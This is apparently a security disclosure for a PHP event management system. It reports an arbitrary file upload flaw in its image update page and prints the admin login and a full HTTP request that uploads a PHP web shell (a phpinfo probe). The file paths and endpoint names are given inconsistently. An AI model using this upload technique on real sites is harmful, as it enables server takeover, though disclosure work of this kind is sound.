# Event Management System v1.0 by Nikhil_B has arbitrary code execution (RCE)

BUG_Author: Gsir

vendors: https://www.sourcecodester.com/php/15238/event-management-system-project-php-source-code.html

The program is built using the xmapp-php8.1 version

Login account: ndbhalerao91@gmail.com/admin (Super Admin account)

Vulnerability url: ip/tour/admin/operations/travellers.php

Loophole location: Event Management System's update_img.php file exists arbitrary file upload (RCE)

Request package for file upload：

```sql
POST /Royal_Event/update_image.php?id=2 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/Royal_Event/update_image.php?id=2%27
Cookie: PHPSESSID=0pba7l89o53c7tini68b77ci0m
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------16095109891890
Content-Length: 435

-----------------------------16095109891890
Content-Disposition: form-data; name="productName"

NikhilÂ Bhalerao
-----------------------------16095109891890
Content-Disposition: form-data; name="productimage1"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------16095109891890
Content-Disposition: form-data; name="submit"


-----------------------------16095109891890--
```

The files will be uploaded to this directory \tour\admin\img
![image](https://user-images.githubusercontent.com/54017627/183230044-35d023ab-de23-4327-9e6c-2f20b057a503.png)


We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/183230035-a8eaf770-966f-4d07-8f8a-a179a94c858c.png)
